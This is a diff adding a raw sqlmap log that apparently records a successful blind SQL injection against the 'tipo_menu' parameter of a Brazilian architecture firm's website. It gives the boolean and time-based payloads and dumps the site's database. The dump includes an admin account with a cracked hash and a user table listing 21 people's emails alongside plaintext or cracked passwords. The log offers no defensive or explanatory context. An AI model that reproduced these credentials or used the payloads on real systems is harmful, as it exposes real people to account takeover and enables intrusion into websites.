@@ -1,0 +1,213 @@
+sqlmap identified the following injection point(s) with a total of 235 HTTP(s) requests:
+---
+Parameter: tipo_menu (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: tipo_menu=3 AND 6458=6458
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: tipo_menu=3 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] appoint
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: tipo_menu (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: tipo_menu=3 AND 6458=6458
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: tipo_menu=3 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: appoint
+[22 tables]
++--------------------+
+| admin              |
+| blocos             |
+| faq                |
+| foto_projeto       |
+| foto_status        |
+| fotos              |
+| historia           |
+| imoveis            |
+| indicacao_negocios |
+| misao              |
+| negocio            |
+| projeto_do_cliente |
+| projetos           |
+| publicacoes        |
+| responsabilidade   |
+| servicos_01        |
+| settings           |
+| slider             |
+| status             |
+| usuario            |
+| valores            |
+| visao              |
++--------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: tipo_menu (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: tipo_menu=3 AND 6458=6458
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: tipo_menu=3 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: appoint
+[22 tables]
++--------------------+
+| admin              |
+| blocos             |
+| faq                |
+| foto_projeto       |
+| foto_status        |
+| fotos              |
+| historia           |
+| imoveis            |
+| indicacao_negocios |
+| misao              |
+| negocio            |
+| projeto_do_cliente |
+| projetos           |
+| publicacoes        |
+| responsabilidade   |
+| servicos_01        |
+| settings           |
+| slider             |
+| status             |
+| usuario            |
+| valores            |
+| visao              |
++--------------------+
+
+Database: appoint
+Table: admin
+[1 entry]
++----+--------------------------------------------------+--------+---------+
+| id | senha                                            | status | usuario |
++----+--------------------------------------------------+--------+---------+
+| 1  | 798a84bbb4011c38c793cdf0c5fa62f4643f9626 (vinho) | 1      | vinho   |
++----+--------------------------------------------------+--------+---------+
+
+Database: appoint
+Table: blocos
+[7 entries]
++----+------+--------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+--------------------------+
+| id | tipo | link                     | texto                                                                                                                                                                                          | imagem                               | titulo                   |
++----+------+--------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+--------------------------+
+| 1  | 1    | servicos.php             | Conhe&ccedil;a nossos servi&ccedil;os em Arquitetura e Engenharia. Mais que profissionais aut&ocirc;nomos, somos uma empresa com a solu&ccedil;&atilde;o completa para nossos clientes!        | 977d18916fe1445da653e5c7e5325c95.jpg | Bloco 01 - Serviços      |
+| 2  | 2    | projetos.php?tipo_menu=3 | <p>\r\n\tClique aqui e conhe&ccedil;a nosso portf&oacute;lio de projetos de Arquitetura e Engenharia.</p>\r\n                                                                                  | aac3078afbbafb71759ac96c078aefc8.jpg | Bloco 02 - Projetos      |
+| 3  | 3    | institucional.php        | <p>\r\n\tConhe&ccedil;a a Appoint Arquitetura e Engenharia e saiba porque nossa empresa &eacute; a mais desejada do mercado.</p>\r\n                                                           | f53304eba2496e6ebef33239255b2d54.jpg | Bloco 03 - Institucional |
+| 4  | 4    | contato.php              | <p>\r\n\tFale agora conosco, teremos o maior prazer em te atender!</p>\r\n                                                                                                                     | 6aa7e5583150c0987e2da72712b67e04.png | Bloco 04 - Fale Conosco  |
+| 5  | 5    | publicacoes.php          | <p>\r\n\tAcompanhe as publica&ccedil;&otilde;es da Appoint, nossas reportagens e entrevistas publicadas na m&iacute;dia.</p>\r\n                                                               | 9c5a8df0d01e126805180cdda6585e87.jpg | Bloco 05 - Publicações   |
+| 6  | 6    | duvidas_frequentes.php   | <p>\r\n\tEst&aacute; pensando em projetar e construir um empreendimento residencial, comercial ou reformar e tem d&uacute;vidas?<br />\r\n\tEsclare&ccedil;a aqui suas d&uacute;vidas.</p>\r\n | 8bb9215d814da217172b60cc7de25b24.jpg | Bloco 06 - Dúvidas       |
+| 7  | contato.php              | 6ae87a8067fce1b620d2a533f7855c2f.png |
++----+------+--------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+--------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: tipo_menu (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: tipo_menu=3 AND 6458=6458
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: tipo_menu=3 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: appoint
+[22 tables]
++--------------------+
+| admin              |
+| blocos             |
+| faq                |
+| foto_projeto       |
+| foto_status        |
+| fotos              |
+| historia           |
+| imoveis            |
+| indicacao_negocios |
+| misao              |
+| negocio            |
+| projeto_do_cliente |
+| projetos           |
+| publicacoes        |
+| responsabilidade   |
+| servicos_01        |
+| settings           |
+| slider             |
+| status             |
+| usuario            |
+| valores            |
+| visao              |
++--------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: tipo_menu (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: tipo_menu=3 AND 6458=6458
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: tipo_menu=3 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: appoint
+Table: usuario
+[21 entries]
++----+-------+--------------------------------------------------+----------------------------------------+---------+--------------------+
+| id | nivel | senha                                            | email                                  | status  | usuario            |
++----+-------+--------------------------------------------------+----------------------------------------+---------+--------------------+
+| 1  | 1     | 6822edc8da4d078fa7dd1f7ec672bd3d1dc2cee8         | alex@vinhonovoag.com.br                | 1       | alex               |
+| 5  | 1     | 40bd001563085fc35165329ea1ff5c5ecbdbbeef (123)   | <blank>                                | 1       | valeria            |
+| 45 | 2     | jnllpp                                           | poliana.lucasg@gmail.com               | <blank> | poliana lucas      |
+| 46 | 2     | liberdade2012                                    | carla_fabriciabispo@hotmail.com        | <blank> | Fabrícia Fernandes |
+| 52 | 2     | i8h9p5z2                                         | alexwebcba@gmail.com                   | <blank> | alex fernando      |
+| 54 | 2     | minhapica                                        | araclidestorres@hotmail.com            | <blank> | araclides          |
+| 59 | 1     | anirak                                           | flavio@appoint.com.br                  | 1       | karina             |
+| 60 | 1     | 2e6f9b0d5885b6010f9167787445617f553a735f (teste) | a@b.com                                | 1       | teste              |
+| 63 | 2     | marialaura                                       | mhorenamhulata200@hotmail.com          | <blank> | creusamariano      |
+| 66 | 1     | 40bd001563085fc35165329ea1ff5c5ecbdbbeef (123)   | <blank>                                | 1       | flavio             |
+| 67 | 1     | 40bd001563085fc35165329ea1ff5c5ecbdbbeef (123)   | <blank>                                | 1       | karina             |
+| 69 | 2     | appoint                                          | contato@appoint.com.br                 | <blank> | appoint            |
+| 70 | 2     | 123456                                           | suely@regionalcereais.com.br           | <blank> | suely              |
+| 71 | 2     | 123456                                           | cam@as.com                             | <blank> | camila             |
+| 72 | 2     | 4684                                             | silmaraassaiantecampanucci@hotmail.com | <blank> | silmara campanucci |
+| 73 | 2     | 22042014                                         | fabio18002011@hotmail.com              | <blank> | fabio              |
+| 74 | 2     | isabela                                          | veraluciacunha26@hotmail.com           | <blank> | vera               |
+| 75 | 2     | alexsandra                                       | andrewilkertop@gmail.com               | <blank> | andre wilker       |
+| 76 | 2     | todopoderoso                                     | onezzino_sp12@hotmail.com              | <blank> | onezino            |
+| 77 | 2     | 99080226r                                        | Rafael-1617@hotmail.com                | <blank> | Rafael             |
+| 78 | 2     | 96014478                                         | gracielevaleriosnp@hotmail.com         | <blank> | graciele           |
++----+-------+--------------------------------------------------+----------------------------------------+---------+--------------------+
+
